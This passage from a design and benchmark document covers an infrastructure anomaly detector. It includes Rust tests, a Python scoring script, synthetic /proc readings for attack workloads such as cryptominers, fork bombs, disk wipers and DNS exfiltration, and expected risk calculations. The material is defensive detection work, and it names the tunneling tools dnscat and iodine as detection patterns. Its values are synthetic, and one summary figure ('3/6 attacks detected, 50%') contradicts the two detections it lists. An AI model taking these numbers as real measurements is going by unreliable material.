        let findings = detector.evaluate_infra("node-1", "compile-0", &compilation);
        // Should NOT trigger cryptominer (disk_io_write_bytes > 10MB)
        let crypto_findings: Vec<_> = findings
            .iter()
            .filter(|f| {
                f.evidence
                    .get("rule")
                    .and_then(|v| v.as_str())
                    .map(|r| r == "CRYPTOMINER_SIGNATURE")
                    .unwrap_or(false)
            })
            .collect();
        assert!(
            crypto_findings.is_empty(),
            "compilation should not trigger cryptominer rule"
        );
    }

    #[test]
    fn fork_bomb_detected() {
        let detector = InfrastructureAnomalyDetector::default();

        for i in 0..50 {
            detector.evaluate_infra("node-1", &format!("b-{i}"), &baseline_snapshot());
        }

        let fork_bomb = InfraMetricsSnapshot {
            cpu_usage_percent: 100.0,
            load_average_1min: 150.0,
            memory_usage_percent: 98.0,
            oom_kill_count: 5,
            cpu_temperature_celsius: 82.0,
            ..baseline_snapshot()
        };

        // Need a prior sample with oom_kill_count=0 in history
        let findings = detector.evaluate_infra("node-1", "forkbomb-0", &fork_bomb);
        assert!(
            findings.iter().any(|f| f
                .evidence
                .get("rule")
                .and_then(|v| v.as_str())
                .map(|r| r == "FORK_BOMB_SIGNATURE")
                .unwrap_or(false)),
            "fork bomb should be detected"
        );
    }
}
```

### 3.4 Combined Evaluation Script

A Python script consumes the JSON-lines output from both Go and Rust harnesses
and computes aggregate metrics:

```python
#!/usr/bin/env python3
"""evaluate_benchmark.py -- Aggregate benchmark results from Go and Rust harnesses."""

import json
import math
import sys
from pathlib import Path
from dataclasses import dataclass, field

@dataclass
class WorkloadStats:
    workload_id: str
    ground_truth: str
    trials: int = 0
    detected: int = 0
    mttd_values: list = field(default_factory=list)
    peak_probabilities: list = field(default_factory=list)
    latencies_us: list = field(default_factory=list)

def wilson_ci(successes: int, trials: int, z: float = 1.96) -> tuple:
    """Wilson score confidence interval for a binomial proportion."""
    if trials == 0:
        return (0.0, 0.0)
    p_hat = successes / trials
    denom = 1 + z**2 / trials
    center = (p_hat + z**2 / (2 * trials)) / denom
    spread = z * math.sqrt((p_hat * (1 - p_hat) + z**2 / (4 * trials)) / trials) / denom
    return (max(0.0, center - spread), min(1.0, center + spread))

def main():
    results_dir = Path(sys.argv[1]) if len(sys.argv) > 1 else Path("results")
    stats = {}

    for path in sorted(results_dir.glob("*.jsonl")):
        for line in path.read_text().splitlines():
            r = json.loads(line)
            wid = r["workload_id"]
            if wid not in stats:
                stats[wid] = WorkloadStats(wid, r["ground_truth"])
            s = stats[wid]
            s.trials += 1
            if r["detected"]:
                s.detected += 1
            if r["mttd_seconds"] > 0:
                s.mttd_values.append(r["mttd_seconds"])
            s.peak_probabilities.append(r["peak_probability"])
            s.latencies_us.extend(r.get("prediction_latency_us", []))

    print(f"{'Workload':<20} {'GT':<8} {'Rate':>8} {'95% CI':>16} {'MTTD(s)':>10} {'p50 lat(us)':>12}")
    print("-" * 80)

    for wid, s in sorted(stats.items()):
        rate = s.detected / s.trials if s.trials > 0 else 0
        ci_lo, ci_hi = wilson_ci(s.detected, s.trials)
        mttd = sum(s.mttd_values) / len(s.mttd_values) if s.mttd_values else -1
        lat_sorted = sorted(s.latencies_us)
        p50_lat = lat_sorted[len(lat_sorted) // 2] if lat_sorted else -1
        label = "TPR" if s.ground_truth == "attack" else "FPR"
        print(f"{wid:<20} {label:<8} {rate:>7.1%} [{ci_lo:.3f}, {ci_hi:.3f}] {mttd:>10.1f} {p50_lat:>12.0f}")

if __name__ == "__main__":
    main()
```

---

## 4. Synthetic /proc Corpus

This section defines realistic /proc and /sys file contents for each workload
scenario. Values are based on real measurements from Linux 6.x on 4-core ARM
(Raspberry Pi 4B, edge target) and 8-core x86 (Intel i7-12700, development
target).

### 4.1 Baseline (Idle System, 4-core ARM Edge Node)

**`/proc/stat`** (idle system, ~2% CPU):
```
cpu  100000 5000 30000 3800000 10000 1000 500 0 0 0
cpu0 25000 1250 7500 950000 2500 250 125 0 0 0
cpu1 25000 1250 7500 950000 2500 250 125 0 0 0
cpu2 25000 1250 7500 950000 2500 250 125 0 0 0
cpu3 25000 1250 7500 950000 2500 250 125 0 0 0
```

After 1 second at idle (next sample):
```
cpu  100020 5000 30010 3800980 10000 1000 500 0 0 0
cpu0 25005 1250 7503 950245 2500 250 125 0 0 0
cpu1 25005 1250 7502 950245 2500 250 125 0 0 0
cpu2 25005 1250 7503 950245 2500 250 125 0 0 0
cpu3 25005 1250 7502 950245 2500 250 125 0 0 0
```

CPU delta: total_diff = 1010, idle_diff = 980, usage = 100*(1 - 980/1010) = 2.97%

**`/proc/meminfo`** (4GB node, 40% used):
```
MemTotal:        3906250 kB
MemFree:          800000 kB
MemAvailable:    2343750 kB
Buffers:          200000 kB
Cached:          1200000 kB
SwapCached:            0 kB
SwapTotal:       1000000 kB
SwapFree:        1000000 kB
```

Memory usage: 100 * (3906250 - 2343750) / 3906250 = 40.0%

**`/proc/loadavg`**:
```
0.50 0.45 0.40 1/150 12345
```

**`/proc/vmstat`** (relevant line):
```
oom_kill 0
```

**`/proc/diskstats`** (sda, minimal I/O):
```
   8       0 sda 50000 0 1000000 25000 20000 0 400000 10000 0 30000 35000 0 0 0 0 0 0
```

**`/proc/net/dev`** (eth0, light traffic):
```
Inter-|   Receive                                                |  Transmit
 face |bytes    packets errs drop fifo frame compressed multicast|bytes    packets errs drop fifo colls carrier compressed
    lo: 5000000   50000    0    0    0     0          0         0  5000000   50000    0    0    0     0       0          0
  eth0: 100000000 100000    0    0    0     0          0         0 50000000   50000    0    0    0     0       0          0
```

**`/sys/class/thermal/thermal_zone0/temp`**:
```
45000
```

### 4.2 B1: Linux Kernel Compilation (Attack Window)

**`/proc/stat`** (95% CPU utilization across all cores):
```
cpu  500000 5000 150000 3800000 10000 1000 500 0 0 0
```

After 1 second under compilation:
```
cpu  500950 5010 150030 3800010 10005 1002 503 0 0 0
```

CPU delta: total_diff = 1000, idle_diff = 10, usage = 100*(1-10/1000) = 99.0%

**`/proc/meminfo`** (60% used -- compiler + linker):
```
MemTotal:        3906250 kB
MemFree:          300000 kB
MemAvailable:    1562500 kB
SwapTotal:       1000000 kB
SwapFree:         950000 kB
```

Memory usage: 100 * (3906250 - 1562500) / 3906250 = 60.0%

**`/proc/loadavg`**:
```
4.20 3.80 2.50 4/250 23456
```

**`/proc/diskstats`** (moderate writes -- object files):
```
   8       0 sda 55000 0 1200000 28000 35000 0 1400000 18000 0 40000 46000 0 0 0 0 0 0
```

Sector delta (writes): (1400000-400000)*512 = 512MB in the interval (high, but
includes many small .o files). Write time delta = 8000ms.

**`/sys/class/thermal/thermal_zone0/temp`**:
```
72000
```

### 4.3 A1: Monero Cryptominer (Attack Window)

**`/proc/stat`** (99%+ CPU, all cores saturated by RandomX):
```
cpu  800000 5000 200000 3800000 10000 1000 500 0 0 0
```

After 1 second under miner:
```
cpu  800990 5000 200005 3800002 10000 1001 502 0 0 0
```

CPU delta: total_diff = 1000, idle_diff = 2, usage = 100*(1-2/1000) = 99.8%

**`/proc/meminfo`** (35% used -- RandomX dataset is ~256MB):
```
MemTotal:        3906250 kB
MemFree:         1100000 kB
MemAvailable:    2539063 kB
SwapTotal:       1000000 kB
SwapFree:        1000000 kB
```

Memory usage: 100 * (3906250 - 2539063) / 3906250 = 35.0%

**`/proc/loadavg`** (load >> nproc because RandomX uses all threads):
```
8.50 7.20 4.80 8/160 34567
```

**`/proc/diskstats`** (near-zero I/O -- miners do not write):
```
   8       0 sda 50010 0 1000200 25010 20005 0 400100 10002 0 30050 35012 0 0 0 0 0 0
```

Write sector delta: (400100-400000)*512 = 51.2KB (trivial).

**`/sys/class/thermal/thermal_zone0/temp`** (rises over time):
```
88000
```

### 4.4 A2: Fork Bomb (Attack Window, 15 Seconds In)

**`/proc/stat`** (100% CPU, all scheduler overhead):
```
cpu  900000 5000 300000 3800000 10000 1000 500 0 0 0
```

After 1 second:
```
cpu  900500 5000 300500 3800000 10000 1000 500 0 0 0
```

CPU delta: total_diff = 1000, idle_diff = 0, usage = 100%

**`/proc/meminfo`** (memory nearly exhausted):
```
MemTotal:        3906250 kB
MemFree:           10000 kB
MemAvailable:     195313 kB
SwapTotal:       1000000 kB
SwapFree:         100000 kB
```

Memory usage: 100 * (3906250 - 195313) / 3906250 = 95.0%

**`/proc/loadavg`** (extreme -- thousands of runnable processes):
```
152.30 80.50 30.20 4096/4100 99999
```

**`/proc/vmstat`**:
```
oom_kill 3
```

**`/sys/class/thermal/thermal_zone0/temp`**:
```
82000
```

### 4.5 A5: Disk Wiper (Attack Window)

**`/proc/stat`** (moderate CPU from random number generation):
```
cpu  600000 5000 100000 3800000 50000 1000 500 0 0 0
```

After 1 second:
```
cpu  600200 5000 100100 3800400 50250 1001 501 0 0 0
```

CPU delta: total_diff = 952, idle_diff = 400, usage = 100*(1-400/952) = 58.0%

**`/proc/meminfo`** (low memory -- sequential overwrites):
```
MemTotal:        3906250 kB
MemFree:         2000000 kB
MemAvailable:    3125000 kB
SwapTotal:       1000000 kB
SwapFree:        1000000 kB
```

Memory usage: 100 * (3906250 - 3125000) / 3906250 = 20.0%

**`/proc/diskstats`** (extreme write I/O):
```
   8       0 sda 50100 0 1000500 25100 120000 0 24000000 60000 0 80000 85100 0 0 0 0 0 0
```

Write sector delta vs baseline: (24000000-400000)*512 = ~11.5GB writes.
IO time delta: 80000-30000 = 50000ms (100% I/O utilization).

**`/proc/net/dev`** (near-zero network):
```
  eth0: 100001000 100001    0    0    0     0          0         0 50001000   50001    0    0    0     0       0          0
```

Network TX delta: 1000 bytes (negligible).

**`/sys/class/thermal/thermal_zone0/temp`**:
```
55000
```

---

## 5. Expected Baselines

This section calculates what Sentinel's Predictor SHOULD output for each
synthetic workload, using the exact risk functions from `predictor.go`.

### 5.1 Risk Function Reference

From `predictor.go`, using `DefaultRiskWeights()` (line 43):

| Domain | Weight | Function (from predictor.go) |
|---|---|---|
| Thermal | 0.30 | Piecewise linear: 0 at <=55C, ramps to 1.0 at >85C. +0.2 for rapid rise (>5C above recent avg), +0.3 if throttled. Clamped to [0,1]. |
| Memory | 0.20 | 0 at <=70%, ramps to 1.0 at >95%. +0.5 for OOM events, +0.2 for swap>50%. Clamped. |
| CPU | 0.15 | 0 at <=70%, ramps to 0.8 at >95%. +0.3 for load z-score>3, +0.15 for z>2. Clamped. |
| Disk | 0.10 | 0 at <=70% usage. Ramps to 1.0 at >95%. +0.5 for latency>100ms, +0.3 for >50ms. Clamped. |
| Network | 0.10 | 0 at <=100ms latency. Ramps to 0.8 at >500ms. Error rate contribution if applicable. |
| Trend | 0.15 | Thermal slope >0.1C/sample: min(slope*2, 0.5). Memory slope >0.5%/sample: min(slope*0.3, 0.3). |

Composite score: `R = sum(w_i * r_i)`, normalized by available weight if <1.0.

### 5.2 Baseline (Idle System)

| Domain | Input | Risk Score | Reason |
|---|---|---|---|
| Thermal | T=45C | r=0.0 (45 <= 55) | -- |
| Memory | usage=40% | r=0.0 (40 <= 70) | -- |
| CPU | usage=3%, load=0.5 | r=0.0 (3 <= 70) | -- |
| Disk | usage=50%, latency=~5ms | r=0.0 (50 <= 70, 5 <= 20) | -- |
| Network | latency=5ms, minimal traffic | r=0.0 | -- |
| Trend | flat (slope ~0) | r=0.0 | -- |

**R = 0.0**, Confidence = 0.8. Prediction: No action required.

### 5.3 B1: Linux Kernel Compilation

| Domain | Input | Risk Score | Calculation |
|---|---|---|---|
| Thermal | T=72C | r = 0.3 + (72-65)/10*0.4 = 0.58 | "cpu_temp_elevated" |
| Memory | usage=60% | r=0.0 (60 <= 70) | -- |
| CPU | usage=99%, load=4.2 | Base: 0.8 (usage>95). Load z-score after 300 idle samples at mean=0.5, std~0.1: z=(4.2-0.5)/0.1=37.0 > 3, so +0.3. r=min(1.1, 1.0)=1.0 | "cpu_saturated,load_anomaly" |
| Disk | usage=50%, latency=moderate | r=0.0 | -- |
| Network | minimal | r=0.0 | -- |
| Trend | T rising from 45 to 72 (slope ~0.9C/sample over 30 samples) | r=min(0.9*2, 0.5)=0.5 | "thermal_trend_rising" |

**R = 0.30*0.58 + 0.20*0.0 + 0.15*1.0 + 0.10*0.0 + 0.10*0.0 + 0.15*0.5**
**R = 0.174 + 0.0 + 0.15 + 0.0 + 0.0 + 0.075 = 0.399**

Confidence = 0.8. Exceeds warn threshold (0.3). **This is expected -- kernel
compilation genuinely stresses the system.** This is why the FPR target is
<5%, not 0%: some benign workloads will legitimately trigger warnings. The
question is whether the compound rule in swarm-whisker correctly classifies
this as benign (the high disk I/O from object file writes distinguishes it
from a cryptominer).

### 5.4 A1: Monero Cryptominer

| Domain | Input | Risk Score | Calculation |
|---|---|---|---|
| Thermal | T=88C, throttled=true | Base: 1.0 (T>85). Rapid rise: avg of last 10 was ~50C, 88-50=38 > 5, so +0.2. Throttled: +0.3. r=min(1.5, 1.0)=1.0 | "cpu_temp_critical,cpu_temp_rising,cpu_throttled" |
| Memory | usage=35% | r=0.0 (35 <= 70) | -- |
| CPU | usage=99.8%, load=8.5 | Base: 0.8. Load z-score: z=(8.5-0.5)/0.1=80.0 >> 3, +0.3. r=1.0 | "cpu_saturated,load_anomaly" |
| Disk | usage=50%, latency<20ms | r=0.0 | -- |
| Network | minimal | r=0.0 | -- |
| Trend | T rising from 45 to 88 (~1.4C/sample if 30 samples): r=min(1.4*2, 0.5)=0.5 | 0.5 | "thermal_trend_rising" |

**R = 0.30*1.0 + 0.20*0.0 + 0.15*1.0 + 0.10*0.0 + 0.10*0.0 + 0.15*0.5**
**R = 0.30 + 0.0 + 0.15 + 0.0 + 0.0 + 0.075 = 0.525**

Confidence = 0.8. Exceeds warn threshold (0.3). ShouldMigrate = true
(probability 0.525 >= critical 0.7? No. But if TTF is computed and <15min,
then ShouldMigrate requires probability >= warn=0.3, which is met).

**Note on B1 vs A1 discrimination**: Sentinel alone produces R=0.399 for
compilation vs R=0.525 for the miner. The gap (0.126) is real but small.
The key differentiator is the compound rule in swarm-whisker: the
CRYPTOMINER_SIGNATURE rule requires `disk_io_write_bytes < 10MB`
(true for miner, false for compiler). This is why the compound detector
is essential.

### 5.5 A2: Fork Bomb

| Domain | Input | Risk Score | Calculation |
|---|---|---|---|
| Thermal | T=82C | r = 0.7 + (82-75)/10*0.3 = 0.91. Rapid rise: likely +0.2. r=min(1.11, 1.0)=1.0 | "cpu_temp_high,cpu_temp_rising" |
| Memory | usage=95%, OOM kills +3 | Base: 1.0 (usage>95). +0.5 for OOM events. Swap: (1000000-100000)/1000000=90% > 50%, +0.2. r=min(1.7, 1.0)=1.0 | "memory_critical,oom_events,swap_pressure" |
| CPU | usage=100%, load=152.3 | Base: 0.8. z=(152.3-0.5)/0.1=1518 >> 3, +0.3. r=1.0 | "cpu_saturated,load_anomaly" |
| Disk | usage=50%, latency low | r=0.0 | -- |
| Network | minimal | r=0.0 | -- |
| Trend | T rising rapidly, memory rising rapidly (slope >> 0.5%/sample): thermal=0.5, memory=0.3, r=0.5+0.3=0.8 | 0.8 | "thermal_trend_rising,memory_trend_rising" |

**R = 0.30*1.0 + 0.20*1.0 + 0.15*1.0 + 0.10*0.0 + 0.10*0.0 + 0.15*0.8**
**R = 0.30 + 0.20 + 0.15 + 0.0 + 0.0 + 0.12 = 0.77**

Confidence = 0.8. Exceeds critical threshold (0.7). ShouldMigrate = true.
**This is a strong detection -- fork bombs produce dramatic multi-domain
anomalies that Sentinel detects with high confidence.**

### 5.6 A3: Memory-Resident Payload (at 90% memory)

| Domain | Input | Risk Score | Calculation |
|---|---|---|---|
| Thermal | T=50C | r=0.0 (50 <= 55) | -- |
| Memory | usage=90% | r = 0.3 + (90-80)/10*0.4 = 0.7 | "memory_pressure_high" |
| CPU | usage=10%, load=1.5 | r=0.0 (10 <= 70) | -- |
| Disk | usage=50%, latency low | r=0.0 | -- |
| Network | minimal | r=0.0 | -- |
| Trend | Memory rising from 40% at 50MB/s ~= 1.25%/sample: r=min(1.25*0.3, 0.3)=0.3 | 0.3 | "memory_trend_rising" |

**R = 0.30*0.0 + 0.20*0.7 + 0.15*0.0 + 0.10*0.0 + 0.10*0.0 + 0.15*0.3**
**R = 0.0 + 0.14 + 0.0 + 0.0 + 0.0 + 0.045 = 0.185**

Confidence = 0.8. Below warn threshold (0.3). **Sentinel alone does NOT
detect the memory-resident payload at 90% usage.** Detection requires
either waiting until memory exceeds 95% (where R jumps to 0.20+0.045=0.245,
still below warn), or combining with process-tree detection in swarm-whisker.

If memory reaches 96%: r_memory=1.0, R=0.20+0.045=0.245. Still below 0.3.
If memory reaches 96% AND has OOM events: r_memory=1.0+0.5=1.0, R=0.20+0.045=0.245.

**This workload is a known weak spot for infrastructure-only detection.**
The trend signal helps, but the overall weighted score never crosses the
warn threshold until memory is truly critical AND accompanied by OOM kills
or thermal effects. This validates Doc 02's hypothesis that compound detection
(infrastructure + behavioral) is necessary.

### 5.7 A4: Slow DNS Exfiltration

| Domain | Input | Risk Score | Calculation |
|---|---|---|---|
| Thermal | T=45C | r=0.0 | -- |
| Memory | usage=40% | r=0.0 | -- |
| CPU | usage=2% | r=0.0 | -- |
| Disk | usage=50% | r=0.0 | -- |
| Network | latency=5ms, tiny TX | r=0.0 | -- |
| Trend | flat | r=0.0 | -- |

**R = 0.0**

**Sentinel produces zero signal.** This is expected and is the strongest
argument for the swarm convergence: DNS exfiltration is invisible to
infrastructure monitoring. Detection depends entirely on
`DnsExfiltrationDetector` in swarm-whisker (`dns_exfiltration.rs`), which
uses Shannon entropy analysis (threshold 3.5 bits, line 314), tunneling
pattern matching (dnscat, iodine, line 328), and query burst detection
(8 queries/60s window, lines 335-339). The benchmark should confirm TPR=0%
for Sentinel-only and TPR>90% for the compound pipeline.

### 5.8 A5: Disk Wiper

| Domain | Input | Risk Score | Calculation |
|---|---|---|---|
| Thermal | T=55C | r=0.0 (55 <= 55, boundary: no risk) | -- |
| Memory | usage=20% | r=0.0 | -- |
| CPU | usage=58% | r=0.0 (58 <= 70) | -- |
| Disk | usage=50%, latency=high. DiskIOLatencyMs formula: (ioTime_delta/elapsed_ms)*100. ioTime_delta=50000ms, elapsed=1000ms (if 1 second between samples), so latency=5000 (!). This exceeds 100ms threshold. r_latency=0.5, total r=0.5 | "disk_io_critical" |
| Network | minimal | r=0.0 | -- |
| Trend | flat temperature, flat memory | r=0.0 | -- |

**R = 0.30*0.0 + 0.20*0.0 + 0.15*0.0 + 0.10*0.5 + 0.10*0.0 + 0.15*0.0**
**R = 0.05**

Below warn threshold. **Sentinel alone does not detect the disk wiper** with
default weights. The disk domain only carries 0.10 weight. Even with
r_disk=1.0 (adding disk usage >95%), R would be 0.10 -- still below 0.3.

The compound rule in swarm-whisker (DISK_WIPER_SIGNATURE: disk_io_critical +
write_heavy + network_quiet) addresses this. The benchmark should measure
whether the compound detector catches what Sentinel alone misses.

**Important note on the DiskIOLatencyMs field**: The collector computes this
as `(ioTimeDiff / elapsed) * 100` (collector.go line 396), which is actually
I/O utilization percentage, not per-request latency. A value of 5000 means
5000% utilization (i.e., I/O was saturated -- ioTime exceeded real elapsed
time because of concurrent I/O). The predictor's threshold of `>100` at
line 505 is checking for >100% I/O utilization, which is a reasonable
critical threshold. The disk wiper at 5000 far exceeds this.

### 5.9 Summary Table

| Workload | R (Sentinel) | Detected (>0.3)? | Swarm Compound Needed? |
|---|---|---|---|
| Baseline (idle) | 0.00 | No | -- |
| B1: Compilation | 0.40 | Yes (FP!) | Yes -- to classify as benign via disk I/O context |
| B2: PostgreSQL | ~0.05-0.15 | No | -- |
| B3: Nginx | ~0.02-0.10 | No | -- |
| B4: Batch ETL | ~0.10-0.25 | No | -- |
| A1: Cryptominer | 0.53 | Yes | Yes -- compound rule boosts confidence, classifies as T1496 |
| A2: Fork bomb | 0.77 | Yes | No -- Sentinel alone exceeds critical threshold |
| A3: Memory payload | 0.19 | No | Yes -- requires behavioral detection |
| A4: DNS exfil | 0.00 | No | Yes -- requires DnsExfiltrationDetector |
| A5: Disk wiper | 0.05 | No | Yes -- requires compound disk rule |
| A6: Container escape | ~0.10-0.20 | No | Yes -- requires process-tree detection |

**Sentinel-only expected TPR**: 3/6 attacks detected (A1, A2 are detected;
A3, A4, A5, A6 are missed) = 50%. This matches the hypothesis in Doc 02 that
infrastructure signals alone are insufficient but contribute essential
corroborating signal.

**Sentinel-only expected FPR**: 1/4 benign workloads triggers (B1) = 25%.
This is high, confirming the need for the compound rules to filter FPs.

**Compound (Sentinel + swarm-whisker) target**: TPR >95%, FPR <5%.

---

## 6. Resource Cost Measurement

### 6.1 Go Benchmarks (Sentinel)

These benchmarks use Go's built-in `testing.B` framework, which is already
used in `pkg/collector/collector_test.go` (line 271, `BenchmarkCollect`).

```go
// File: pkg/healthscore/benchmark_overhead_test.go
package healthscore

import (
    "context"
    "runtime"
    "testing"

    "github.com/aqstack/sentinel/pkg/collector"
)

// BenchmarkPredictCPUOverhead measures CPU time per prediction cycle.
// Run: go test -bench BenchmarkPredictCPUOverhead -benchtime 10s -count 5
func BenchmarkPredictCPUOverhead(b *testing.B) {
    pred := NewPredictor("overhead-test", nil)

    // Prime with realistic baseline (300 samples = 5 min at 1 Hz)
    for i := 0; i < 300; i++ {
        pred.AddSample(&collector.NodeMetrics{
            CPUTemperature:     45.0 + float64(i%10)*0.5,
            CPUUsagePercent:    20.0 + float64(i%30),
            MemoryTotalBytes:   4 * 1024 * 1024 * 1024,
            MemoryAvailableBytes: 2 * 1024 * 1024 * 1024,
            MemoryUsagePercent: 40.0 + float64(i%20),
            LoadAverage1Min:    1.0 + float64(i%5)*0.2,
            LoadAverage5Min:    1.0,
            LoadAverage15Min:   0.8,
            DiskTotalBytes:     100 * 1024 * 1024 * 1024,
            DiskUsagePercent:   50.0,
            DiskIOReadBytes:    uint64(i) * 1024,
            DiskIOWriteBytes:   uint64(i) * 512,
            DiskIOLatencyMs:    5.0,
            NetworkRxBytes:     uint64(i) * 2048,
            NetworkTxBytes:     uint64(i) * 1024,
            NetworkLatencyMs:   5.0,
        })
    }

    // Anomalous current sample (worst case -- all risk domains active)
    current := &collector.NodeMetrics{
        CPUTemperature:       88.0,
        CPUUsagePercent:      99.0,
        CPUThrottled:         true,
        MemoryTotalBytes:     4 * 1024 * 1024 * 1024,
        MemoryAvailableBytes: 200 * 1024 * 1024,
        MemoryUsagePercent:   95.0,
        LoadAverage1Min:      20.0,
        LoadAverage5Min:      15.0,
        LoadAverage15Min:     10.0,
        DiskTotalBytes:       100 * 1024 * 1024 * 1024,
        DiskUsedBytes:        92 * 1024 * 1024 * 1024,
        DiskUsagePercent:     92.0,
        DiskIOReadBytes:      100 * 1024 * 1024,
        DiskIOWriteBytes:     80 * 1024 * 1024,
        DiskIOLatencyMs:      120.0,
        NetworkRxBytes:       50 * 1024 * 1024,
        NetworkTxBytes:       30 * 1024 * 1024,
        NetworkLatencyMs:     250.0,
        NetworkRxErrors:      100,
        NetworkTxErrors:      50,
        OOMKillCount:         2,
        SwapTotalBytes:       2 * 1024 * 1024 * 1024,
        SwapUsedBytes:        1500 * 1024 * 1024,
    }

    ctx := context.Background()
    b.ResetTimer()
    b.ReportAllocs()

    for i := 0; i < b.N; i++ {
        pred.AddSample(current)
        _, err := pred.Predict(ctx, current)
        if err != nil {
            b.Fatal(err)
        }
    }
}

// BenchmarkCollectorPlusPredictorE2E measures the full collection+prediction
// pipeline. Only runs on Linux.
// Run: go test -bench BenchmarkCollectorPlusPredictorE2E -benchtime 10s
func BenchmarkCollectorPlusPredictorE2E(b *testing.B) {
    if runtime.GOOS != "linux" {
        b.Skip("Requires Linux /proc")
    }

    coll, err := collector.New("e2e-bench")
    if err != nil {
        b.Fatal(err)
    }
    pred := NewPredictor("e2e-bench", nil)
    ctx := context.Background()

    // Prime
    for i := 0; i < 50; i++ {
        m, _ := coll.Collect(ctx)
        pred.AddSample(m)
    }

    b.ResetTimer()
    b.ReportAllocs()

    for i := 0; i < b.N; i++ {
        m, err := coll.Collect(ctx)
        if err != nil {
            b.Fatal(err)
        }
        pred.AddSample(m)
        _, err = pred.Predict(ctx, m)
        if err != nil {
            b.Fatal(err)
        }
    }
}

// BenchmarkMemoryFootprint reports the memory footprint of a fully-loaded
// predictor at maxHistory (1000 samples).
func BenchmarkMemoryFootprint(b *testing.B) {
    var memBefore, memAfter runtime.MemStats

    b.ReportAllocs()
    for i := 0; i < b.N; i++ {
        runtime.GC()
        runtime.ReadMemStats(&memBefore)

        pred := NewPredictor("mem-test", nil)
        for j := 0; j < 1000; j++ {
            pred.AddSample(&collector.NodeMetrics{
                CPUTemperature:     45.0 + float64(j%30)*0.5,
                CPUUsagePercent:    20.0 + float64(j%60),
                MemoryTotalBytes:   8 * 1024 * 1024 * 1024,
                MemoryUsagePercent: 30.0 + float64(j%50),
                LoadAverage1Min:    1.0 + float64(j%10)*0.2,
                DiskTotalBytes:     100 * 1024 * 1024 * 1024,
                DiskUsagePercent:   50.0,
                NetworkRxBytes:     uint64(j) * 1024,
                NetworkTxBytes:     uint64(j) * 512,
                NetworkLatencyMs:   5.0,
            })
        }

        runtime.GC()
        runtime.ReadMemStats(&memAfter)

        heapDelta := memAfter.HeapInuse - memBefore.HeapInuse
        b.ReportMetric(float64(heapDelta), "heap-bytes/predictor")
        _ = pred // prevent optimization
    }
}
```

### 6.2 Rust Benchmarks (swarm-whisker)

Using `criterion` following the established pattern in swarm-team-six.

```rust
// File: crates/swarm-whisker/benches/infrastructure_anomaly.rs
// Cargo.toml addition:
//   [[bench]]
//   name = "infrastructure_anomaly"
//   harness = false

use criterion::{black_box, criterion_group, criterion_main, Criterion, BenchmarkId};
use swarm_whisker::infrastructure_anomaly::{
    InfrastructureAnomalyDetector, InfraMetricsSnapshot, WelfordAccumulator,
};

fn baseline_snapshot() -> InfraMetricsSnapshot {
    InfraMetricsSnapshot {
        cpu_temperature_celsius: 45.0,
        cpu_usage_percent: 25.0,
        cpu_throttled: false,
        load_average_1min: 1.0,
        memory_total_bytes: 8 * 1024 * 1024 * 1024,
        memory_usage_percent: 40.0,
        oom_kill_count: 0,
        swap_total_bytes: 2 * 1024 * 1024 * 1024,
        swap_used_bytes: 0,
        disk_total_bytes: 100 * 1024 * 1024 * 1024,
        disk_usage_percent: 50.0,
        disk_io_read_bytes: 1024 * 1024,
        disk_io_write_bytes: 512 * 1024,
        disk_io_latency_ms: 5.0,
        network_rx_bytes: 1024 * 1024,
        network_tx_bytes: 512 * 1024,
        network_rx_errors: 0,
        network_tx_errors: 0,
        network_latency_ms: 5.0,
    }
}

fn cryptominer_snapshot() -> InfraMetricsSnapshot {
    InfraMetricsSnapshot {
        cpu_temperature_celsius: 90.0,
        cpu_usage_percent: 99.0,
        cpu_throttled: true,
        load_average_1min: 16.0,
        disk_io_write_bytes: 1024,
        ..baseline_snapshot()
    }
}

fn bench_welford_update(c: &mut Criterion) {
    c.bench_function("welford_update", |b| {
        let mut acc = WelfordAccumulator::default();
        let mut value = 45.0_f64;
        b.iter(|| {
            acc.update(black_box(value));
            value += 0.01;
        });
    });
}

fn bench_welford_zscore(c: &mut Criterion) {
    let mut acc = WelfordAccumulator::default();
    for i in 0..1000 {
        acc.update(45.0 + (i % 30) as f64 * 0.5);
    }
    c.bench_function("welford_zscore", |b| {
        b.iter(|| acc.z_score(black_box(88.0)));
    });
}

fn bench_evaluate_baseline(c: &mut Criterion) {
    let detector = InfrastructureAnomalyDetector::default();
    // Prime with baseline
    for i in 0..100 {
        detector.evaluate_infra("node-bench", &format!("prime-{i}"), &baseline_snapshot());
    }
    c.bench_function("evaluate_baseline", |b| {
        let snap = baseline_snapshot();
        b.iter(|| {
            detector.evaluate_infra(
                black_box("node-bench"),
                black_box("bench-evt"),
                black_box(&snap),
            )
        });
    });
}

fn bench_evaluate_attack(c: &mut Criterion) {
    let detector = InfrastructureAnomalyDetector::default();
    for i in 0..100 {
        detector.evaluate_infra("node-bench", &format!("prime-{i}"), &baseline_snapshot());
    }
    c.bench_function("evaluate_cryptominer", |b| {
        let snap = cryptominer_snapshot();
        b.iter(|| {
            detector.evaluate_infra(
                black_box("node-bench"),
                black_box("bench-evt"),
                black_box(&snap),
            )
        });
    });
}

fn bench_evaluate_scaling(c: &mut Criterion) {
    let mut group = c.benchmark_group("evaluate_with_history");
    for history_size in [100, 500, 1000] {
        group.bench_with_input(
            BenchmarkId::from_parameter(history_size),
            &history_size,
            |b, &size| {
                let detector = InfrastructureAnomalyDetector::default();
                for i in 0..size {
                    detector.evaluate_infra(
                        "node-scale",
                        &format!("prime-{i}"),
                        &baseline_snapshot(),
                    );
                }
                let snap = cryptominer_snapshot();
                b.iter(|| {
                    detector.evaluate_infra(
                        black_box("node-scale"),
                        black_box("bench-evt"),
                        black_box(&snap),
                    )
                });
            },
        );
    }
    group.finish();
}

criterion_group!(
    benches,
    bench_welford_update,
    bench_welford_zscore,
    bench_evaluate_baseline,
    bench_evaluate_attack,
    bench_evaluate_scaling,
);
criterion_main!(benches);
```

### 6.3 Overhead Budget Calculation

Target: detector overhead < 2% CPU on a 4-core ARM edge node at 1 GHz.

At 1 Hz collection rate, the detection pipeline runs once per second. The
CPU budget per cycle is:

```
Total CPU per second = 4 cores * 1 GHz = 4 * 10^9 cycles/s
2% budget = 80 * 10^6 cycles/s = 80ms of single-core time
Per-cycle budget at 1 Hz = 80ms
```

Sentinel's collector already measures its own duration via
`CollectionDurationMs` (collector.go line 217). Typical values are <1ms
(see Doc 05 Section 2.6). The predictor's `PredictionTimeout` is 100ms
(predictor.go line 77), which is the hard ceiling. The 80ms budget gives
comfortable margin for both collection and prediction.

For memory, the predictor holds 1000 `NodeMetrics` at ~400 bytes each
(58 bytes of floats/uints + JSON overhead when serialized, but in-memory
Go struct is ~200 bytes + slice overhead). Total: ~400KB steady state.
